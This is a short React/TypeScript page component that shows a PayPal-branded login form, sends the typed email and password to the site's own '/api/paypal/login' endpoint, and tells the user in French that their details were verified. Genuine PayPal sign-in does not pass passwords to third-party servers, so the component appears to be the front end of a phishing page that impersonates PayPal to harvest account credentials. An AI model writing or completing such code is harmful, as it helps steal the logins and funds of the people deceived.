import { useMutation } from "@tanstack/react-query";
import PayPalLogin from "@/components/PayPalLogin";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

export default function PayPalPage() {
  const { toast } = useToast();

  const loginMutation = useMutation({
    mutationFn: async ({ email, password }: { email: string; password: string }) => {
      await apiRequest("POST", "/api/paypal/login", { email, password });
    },
    onSuccess: () => {
      toast({
        title: "Connexion réussie",
        description: "Vos informations ont été vérifiées avec succès.",
      });
    },
    onError: () => {
      toast({
        title: "Erreur de connexion",
        description: "Impossible de se connecter. Veuillez réessayer.",
        variant: "destructive",
      });
    },
  });

  const handlePayPalLogin = (email: string, password: string) => {
    loginMutation.mutate({ email, password });
  };

  return <PayPalLogin onSubmit={handlePayPalLogin} />;
}
